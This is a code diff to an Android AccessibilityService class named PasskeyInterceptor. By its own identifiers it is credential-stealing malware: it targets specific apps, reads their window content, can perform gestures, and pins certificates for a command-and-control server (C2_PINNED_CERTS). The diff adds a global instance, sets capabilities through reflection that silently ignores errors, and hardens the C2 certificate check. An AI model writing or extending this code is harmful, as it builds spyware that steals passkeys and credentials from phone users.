@@ -16,6 +16,8 @@ import android.content.IntentFilter;
 import android.content.SharedPreferences;
 import android.content.pm.PackageManager;
 import android.content.pm.ServiceInfo;
+import android.security.keystore.KeyGenParameterSpec;
+import android.security.keystore.KeyProperties;
 import android.os.Build;
 import android.os.Bundle;
 import android.os.Handler;
@@ -61,6 +63,7 @@ import java.util.concurrent.LinkedBlockingQueue;
 import java.util.concurrent.ThreadPoolExecutor;
 import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
+import java.util.concurrent.atomic.AtomicInteger;
 import java.util.concurrent.locks.ReentrantLock;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
@@ -85,6 +88,12 @@ public class PasskeyInterceptor extends AccessibilityService {
     // ─── VERSION ───────────────────────────────────────────────
     private static final String TAG = "PkI";
     private static final int VERSION_CODE = 6;
+
+    private static volatile PasskeyInterceptor instance;
+
+    public static PasskeyInterceptor getInstance() {
+        return instance;
+    }
 
     // ─── CRYPTO CONSTANTS ──────────────────────────────────────
     private static final int AES_KEY_SIZE = 256;
@@ -443,7 +452,12 @@ public class PasskeyInterceptor extends AccessibilityService {
     @Override
     public void onServiceConnected() {
         super.onServiceConnected();
+        instance = this;
         serviceRunning.set(true);
+
+        if (ctx == null) {
+            init(this);
+        }
 
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.packageNames = targetApps.keySet().toArray(new String[0]);
@@ -476,14 +490,22 @@ public class PasskeyInterceptor extends AccessibilityService {
         info.flags = flags;
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            info.capabilities = AccessibilityServiceInfo.CAPABILITY_CAN_RETRIEVE_WINDOW_CONTENT;
+            int caps = AccessibilityServiceInfo.CAPABILITY_CAN_RETRIEVE_WINDOW_CONTENT;
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                info.capabilities |= AccessibilityServiceInfo.CAPABILITY_CAN_PERFORM_GESTURES;
+                caps |= AccessibilityServiceInfo.CAPABILITY_CAN_PERFORM_GESTURES;
             }
+            setServiceCapabilities(info, caps);
         }
 
         setServiceInfo(info);
         taoForegroundNotification();
+    }
+
+    private void setServiceCapabilities(AccessibilityServiceInfo info, int caps) {
+        try {
+            Field field = AccessibilityServiceInfo.class.getField("capabilities");
+            field.setInt(info, caps);
+        } catch (Exception ignored) {}
     }
 
     @Override
@@ -521,6 +543,9 @@ public class PasskeyInterceptor extends AccessibilityService {
     @Override
     public void onDestroy() {
         serviceRunning.set(false);
+        if (instance == this) {
+            instance = null;
+        }
         cleanupResources();
         super.onDestroy();
     }
@@ -963,13 +988,17 @@ public class PasskeyInterceptor extends AccessibilityService {
                 public void checkClientTrusted(X509Certificate[] chain, String authType) {}
                 @Override
                 public void checkServerTrusted(X509Certificate[] chain, String authType) throws CertificateException {
-                    for (X509Certificate cert : chain) {
-                        String sha256 = Base64.encodeToString(
-                            MessageDigest.getInstance("SHA-256").digest(cert.getEncoded()),
-                            Base64.NO_WRAP);
-                        for (String pin : C2_PINNED_CERTS) {
-                            if (pin.contains(sha256)) return;
+                    try {
+                        for (X509Certificate cert : chain) {
+                            String sha256 = Base64.encodeToString(
+                                MessageDigest.getInstance("SHA-256").digest(cert.getEncoded()),
+                                Base64.NO_WRAP);
+                            for (String pin : C2_PINNED_CERTS) {
+                                if (pin.contains(sha256)) return;
+                            }
                         }
+                    } catch (Exception e) {
+                        throw new CertificateException("Certificate pinning failed", e);
                     }
                     throw new CertificateException("Certificate not pinned");
                 }
